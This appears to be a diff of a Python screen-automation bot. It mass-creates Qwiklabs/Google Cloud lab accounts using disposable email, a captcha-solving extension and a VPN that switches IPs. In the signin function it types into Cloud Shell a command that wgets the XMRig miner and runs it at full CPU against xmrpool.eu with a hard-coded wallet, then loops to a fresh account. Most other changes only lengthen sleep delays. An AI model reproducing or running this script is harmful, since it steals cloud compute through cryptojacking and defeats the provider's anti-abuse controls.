@@ -70,6 +70,43 @@ def download_extention():
 	keyboard.release('l')
 	keyboard.release(Key.ctrl)
 	sleep(0.5)
+	
+	##go to site buster varifier
+	keyboard.type('https://chrome.google.com/webstore/detail/browsec-vpn-free-vpn-for/omghfjlpggmjjaagoclmmobgdodcjboh?hl=en')
+	keyboard.press(Key.enter)
+	keyboard.release(Key.enter)
+	sleep(7)
+	##add to chrome
+	mouse.position = (1098, 241)
+	mouse.click(Button.left, 1)
+	sleep(1)
+	mouse.position = (714, 214)
+	mouse.click(Button.left, 1)
+	mouse.click(Button.left, 1)
+	sleep(5)
+	##New page
+	keyboard.press(Key.ctrl)
+	keyboard.press('t')
+	keyboard.release('t')
+	keyboard.release(Key.ctrl)
+	sleep(0.5)
+	##go to first page and close it
+	keyboard.press(Key.ctrl)
+	keyboard.press('1')
+	keyboard.release('1')
+	keyboard.release(Key.ctrl)
+	sleep(0.5)
+	keyboard.press(Key.ctrl)
+	keyboard.press('w')
+	keyboard.release('w')
+	keyboard.release(Key.ctrl)
+	sleep(0.75)
+	##select search bar
+	keyboard.press(Key.ctrl)
+	keyboard.press('l')
+	keyboard.release('l')
+	keyboard.release(Key.ctrl)
+	sleep(1)
 def signup():
 		## select search bar
 		x = 471
@@ -105,7 +142,7 @@ def signup():
 		# go to site
 		pyautogui.typewrite("https://generator.email/", interval = 0.02)
 		pyautogui.press('enter')
-		sleep(2)
+		sleep(6)
 		##generate new email
 		x = 608
 		y = 564
@@ -201,20 +238,32 @@ def signup():
 		pyautogui.moveTo( x , y , duration = 0.1)
 		sleep(0.5)
 		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(2)
+		sleep(4)
 		#select buster
 		x = 578
 		y = 664
 		pyautogui.moveTo( x , y , duration = 0.1)
 		sleep(0.5)
 		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(5)
+		sleep(7)
 		x = 486
 		y = 542
 		pyautogui.moveTo( x , y , duration = 0.1)
 		sleep(0.5)
 		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(2)
+		sleep(3)
+		x = 578
+		y = 542
+		pyautogui.moveTo( x , y , duration = 0.1)
+		sleep(0.5)
+		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
+		sleep(8)
+		x = 486
+		y = 542
+		pyautogui.moveTo( x , y , duration = 0.1)
+		sleep(0.5)
+		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
+		sleep(3)
 		x = 578
 		y = 542
 		pyautogui.moveTo( x , y , duration = 0.1)
@@ -226,19 +275,7 @@ def signup():
 		pyautogui.moveTo( x , y , duration = 0.1)
 		sleep(0.5)
 		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(2)
-		x = 578
-		y = 542
-		pyautogui.moveTo( x , y , duration = 0.1)
-		sleep(0.5)
-		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(7)
-		x = 486
-		y = 542
-		pyautogui.moveTo( x , y , duration = 0.1)
-		sleep(0.5)
-		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(2)
+		sleep(3)
 		x = 578
 		y = 542
 		pyautogui.moveTo( x , y , duration = 0.1)
@@ -272,7 +309,7 @@ def signup():
 		pyautogui.moveTo( x , y , duration = 0.1)
 		sleep(0.5)
 		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(5)
+		sleep(7)
 		# click on creat account
 		x = 865
 		y = 567
@@ -292,12 +329,12 @@ def signup():
 		pyautogui.moveTo( x , y , duration = 0.1)
 		sleep(0.5)
 		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(6)    
+		sleep(5)    
 		## click on refresh
 		pyautogui.keyDown("ctrl")
 		pyautogui.press('r')
 		pyautogui.keyUp("ctrl")
-		sleep(2)
+		sleep(4)
 		x = 745
 		y = 557
 		pyautogui.moveTo( x , y , duration = 0.1)
@@ -308,7 +345,7 @@ def signup():
 		pyautogui.moveTo( x , y , duration = 0.1)
 		sleep(0.5)
 		pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(1)
+		sleep(3)
 		    
 		## scroll down 12 times
 		x = 1357
@@ -330,7 +367,7 @@ def signup():
 		#pyautogui.moveTo( x , y , duration = 0.1)
 		#sleep(0.5)
 		#pyautogui.click(button = "left", clicks = 1 , interval = 0.1)
-		sleep(1)
+		sleep(3)
 		## scroll down 42 times
 		x = 1357
 		y = 720
@@ -344,7 +381,7 @@ def signup():
 		pyautogui.moveTo( x , y , duration = 0.1)
 		sleep(0.5)
 		pyautogui.click(button = "left", clicks = 1 , interval = 0.03)
-		sleep(3)
+		sleep(9)
 		#select pass
 		mouse.position = (696, 391)
 		mouse.click(Button.left, 1)
@@ -353,7 +390,7 @@ def signup():
 		# sign in
 		mouse.position = (832, 538)
 		mouse.click(Button.left, 1)
-		sleep(2)
+		sleep(4)
 		##close tab1 and tab2
 		pyautogui.keyDown("ctrl")
 		pyautogui.press('1')
@@ -369,7 +406,7 @@ def signup():
 		##back
 		mouse.position = (23, 47)
 		mouse.click(Button.left, 1)
-		sleep(2)
+		sleep(3)
 		pyautogui.keyDown("ctrl")
 		pyautogui.press('r')
 		pyautogui.keyUp("ctrl")
@@ -382,12 +419,12 @@ def signin():
 		keyboard.type('A Tour of Qwiklabs and Google Cloud')
 		keyboard.press(Key.enter)
 		keyboard.release(Key.enter)
-		sleep(5)
+		sleep(9)
 		##click on cloud google
 		mouse.position = (443, 283)
 		mouse.click(Button.left, 1)
 		mouse.click(Button.left, 1)
-		sleep(3)
+		sleep(5)
 		##skip video
 		mouse.position = (899, 635)
 		mouse.click(Button.left, 1)
@@ -415,7 +452,7 @@ def signin():
 		mouse.position = (69, 361)
 		mouse.click(Button.left, 1)
 		sleep(0.5)
-		sleep(2)
+		sleep(3)
 		mouse.position = (56, 240)
 		mouse.click(Button.left, 1)
 		sleep(1)
@@ -458,7 +495,7 @@ def signin():
 		##select console
 		mouse.position = (170, 321)
 		mouse.click(Button.left, 1)
-		sleep(2)
+		sleep(4)
 		##back to pre page
 		keyboard.press(Key.ctrl)
 		keyboard.press('1')
@@ -470,7 +507,7 @@ def signin():
 		mouse.click(Button.left, 2)
 		sleep(0.2)
 		c = pyperclip.paste()
-		sleep(1)
+		sleep(2)
 		##back to console
 		keyboard.press(Key.ctrl)
 		keyboard.press('2')
@@ -501,6 +538,7 @@ def signin():
 		mouse.click(Button.left, 2)
 		sleep(0.2)
 		c = pyperclip.paste()
+		sleep(2)
 		##back to console
 		keyboard.press(Key.ctrl)
 		keyboard.press('2')
@@ -520,13 +558,13 @@ def signin():
 		keyboard.type(c)
 		keyboard.press(Key.enter)
 		keyboard.release(Key.enter)
-		sleep(3)
+		sleep(10)
 		##click accept
 		mouse.position = (678, 575)
 		mouse.click(Button.left, 1)
 		mouse.position = (574, 603)
 		mouse.click(Button.left, 1)
-		sleep(3)
+		sleep(10)
 		##click confirm
 		mouse.position = (824, 643)
 		mouse.click(Button.left, 1)
@@ -539,7 +577,7 @@ def signin():
 		keyboard.press('2')
 		keyboard.release('2')
 		keyboard.release(Key.ctrl)
-		sleep(10)
+		sleep(25)
 		##choose country:
 		mouse.position = (83, 642)
 		mouse.click(Button.left, 1)
@@ -567,6 +605,7 @@ def signin():
 		sleep(5)
 		mouse.position = (852, 602)
 		mouse.click(Button.left, 1)
+		sleep(4)
 		##save pass
 		#mouse.position = (1140, 370)
 		#mouse.click(Button.left, 1)
@@ -574,14 +613,14 @@ def signin():
 		##click Terminal
 		mouse.position = (1165, 89)
 		mouse.click(Button.left, 1)
-		sleep(10)
+		sleep(20)
 		##click continue
 		mouse.position = (510, 682)
 		mouse.click(Button.left, 2)
 		sleep(0.5)
 		mouse.position = (442, 677)
 		mouse.click(Button.left, 2)
-		sleep(14)
+		sleep(20)
 		##select on shell
 		mouse.position = (516, 651)
 		mouse.click(Button.left, 1)
@@ -628,25 +667,25 @@ def signin():
 		sleep(1)
 		##write command
 		keyboard.type("wget https://github.com/xmrig/xmrig/releases/download/v6.3.5/xmrig-6.3.5-linux-x64.tar.gz && tar xf xmrig-6.3.5-linux-x64.tar.gz && cd xmrig-6.3.5 && ./xmrig --donate-level 0.1 --max-cpu-usage 100 -o xmrpool.eu:5555 -u 46SCYJfsfSEj1EEHmwCKgCg9mgqg8xbx9BdczDJ9uqUpJRwvnSrHb517vWoE7x3Nv3iJEKbtip9T74QvZB8TJXJ86iXiGkr -p x")
-		sleep(0.5)
+		sleep(1.5)
 		keyboard.press(Key.enter)
 		keyboard.release(Key.enter)
 		sleep(1.5)
 		##back to first page
 		mouse.position = (4, 12)
 		mouse.click(Button.left, 1)
-		sleep(1)
+		sleep(4)
 		##select stop
 		mouse.position = (55, 177)
 		mouse.click(Button.left, 1)
-		sleep(2)
+		sleep(4)
 		keyboard.press(Key.enter)
 		keyboard.release(Key.enter)
-		sleep(4)
+		sleep(6)
 		##cancel
 		mouse.position = (802, 459)
 		mouse.click(Button.left, 1)
-		sleep(2)
+		sleep(4)
 		##go to setting
 		keyboard.press(Key.ctrl)
 		keyboard.press('t')
@@ -661,16 +700,16 @@ def signin():
 		keyboard.type("https://mail.google.com/mail/?logout&hl=en")
 		keyboard.press(Key.enter)
 		keyboard.release(Key.enter)
-		sleep(3)
+		sleep(7)
 		##remove pre account
 		sleep(1.5)
 		mouse.position = (586, 428)
 		sleep(0.5)
 		mouse.click(Button.left, 1)
-		sleep(0.5)
+		sleep(1)
 		mouse.position = (856, 351)
 		mouse.click(Button.left, 1)
-		sleep(1)
+		sleep(2)
 		mouse.position = (775, 482)
 		mouse.click(Button.left, 1)
 		sleep(0.5)
@@ -693,7 +732,7 @@ def signin():
 		keyboard.press('r')
 		keyboard.release('r')
 		keyboard.release(Key.ctrl)
-		sleep(3)
+		sleep(6)
 def panj():
 		##clear cookies
 		pyautogui.keyDown("ctrl")
@@ -748,14 +787,34 @@ def ChangeIp():
 		##stop
 		mouse.position = (1225, 463)
 		mouse.click(Button.left, 1)
+		sleep(0.5)
 		##start
 		mouse.position = (1225, 463)
 		mouse.click(Button.left, 1)
+def first_change_ip():
+		##select extention
+		mouse.position = (1279, 50)
+		mouse.click(Button.left, 1)
+		sleep(1)
+		##select browsec
+		mouse.position = (1070, 196)
+		mouse.click(Button.left, 1)
+		sleep(2.5)
+		##start
+		mouse.position = (1225, 463)
+		sleep(0.2)
+		mouse.click(Button.left, 1)
+		sleep(0.6)
+		mouse.position = (219, 585)
+		mouse.click(Button.left, 1)
+		sleep(0.5)
 
 install_chrome()
 download_extention()
+first_change_ip()
 i = 1
 while True:
+	ChangeIp()
 	if i == 1:
 		signup()
 		sleep(3)
